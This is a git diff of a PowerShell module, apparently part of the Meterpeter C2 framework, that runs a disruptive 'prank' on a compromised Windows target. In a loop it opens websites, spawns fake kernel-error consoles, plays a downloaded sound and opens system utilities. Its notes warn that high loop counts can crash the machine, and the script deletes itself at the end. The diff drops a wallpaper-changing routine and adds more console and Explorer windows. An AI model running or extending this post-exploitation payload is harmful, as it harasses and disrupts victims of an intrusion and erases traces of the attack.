@@ -6,14 +6,13 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: IWR, Media.SoundPlayer {native}
    Optional Dependencies: Critical.wav {auto-download}
-   PS cmdlet Dev version: v1.2.11
+   PS cmdlet Dev version: v1.2.12
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.12 that executes a prank in background.
    The prank consists in spawning diferent Gay websites on target default browser,
    spawn cmd terminal consoles pretending to be a kernel error while executing an
    sfx sound effect. It also spawns windows diskmgmt.msc, firewall.cpl, appwiz.cpl
-   programs and changes desktop wallpaper if invoked -BSODWallpaper 'true' param.
 
 .NOTES
    Invoking -maxinteractions greater than '200' will probably trigger BSOD.
@@ -33,9 +32,6 @@
 
 .Parameter PreventBSOD
    Prevent the prank from BSOD target? (default: true)
-
-.Parameter BSODWallpaper
-   Change target desktop wallpaper? (default: false)
   
 .EXAMPLE
    PS C:\> .\C2Prank.ps1
@@ -53,10 +49,6 @@
    PS C:\> .\C2Prank.ps1 -delaytime '60' -wavefile 'alert.wav'
    Loops for 20 times with 60 seconds of delay + alert.wav as sfx
 
-.EXAMPLE
-   PS C:\> .\C2Prank.ps1 -MaxInteractions '8' -BSODWallpaper 'true'
-   Loops for 8 times max and changes the desktop wallpaper on exit.
-
 .INPUTS
    None. You cannot pipe objects into C2Prank.ps1
 
@@ -64,10 +56,6 @@
    * Powershell Fake BSOD Prank
      => Download 'Critical error' sfx sound effect
    * maxinteractions: 20 with: 30 (seconds)
-   * Modify desktop wallpaper to BSOD wallpaper
-     => Download BSOD wallpaper from my github repo
-     => Add TypeDefinition and set wallpaper automatic
-   * created: RevertWallpaper.ps1 in current directory
    
 .LINK
    https://github.com/r00t-3xp10it/meterpeter
@@ -77,7 +65,6 @@
 
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$WaveFile="Critical.wav", #Main sfx sound effect
-   [string]$BSODwallpaper="false",   #Change desktop wallpaper?
    [string]$PreventBSOD="true",      #Prevent the prank from BSOD?
    [int]$MaxInteractions='20',       #How many times to loop jump?
    [int]$DelayTime='20'              #Delay time between loops? (seconds)
@@ -168,6 +155,9 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
    Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
+   Start-Sleep -Seconds 1
+   Start $Env:PROGRAMFILES
+
    If($i -Match '^(3|7|12|13|15|16|18|20|23|27|30|32|33|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open drive manager
@@ -190,6 +180,9 @@ For($i=1; $i -lt $MaxInteractions; $i++)
       $PlayWav.playsync();
    }
 
+   #Spawn cmd terminal console and make it look like one kernel error as ocurr
+   Start-Process cmd.exe -argumentlist "/c color C0&title $MsgBoxTitle&echo $MsgBoxText&Pause"
+
 }
 
 
@@ -199,27 +192,6 @@ Remove-Item -Path "$WaveFile" -Force
 
 #Spawn alert message box at loop completed
 powershell (New-Object -ComObject Wscript.Shell).Popup("$MsgBoxText",0,"$MsgBoxTitle",0+64)|Out-Null
-
-
-$setwallpapersrc = @"
-using System.Runtime.InteropServices;
-
-public class Wallpaper
-{
-  public const int SetDesktopWallpaper = 20;
-  public const int UpdateIniFile = 0x01;
-  public const int SendWinIniChange = 0x02;
-  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-  public static void SetWallpaper(string path)
-  {
-    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
-  }
-}
-"@
-
-#BlueScreenOfDeath - Prank
-
 
 #Auto Delete this cmdlet in the end ...
 Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
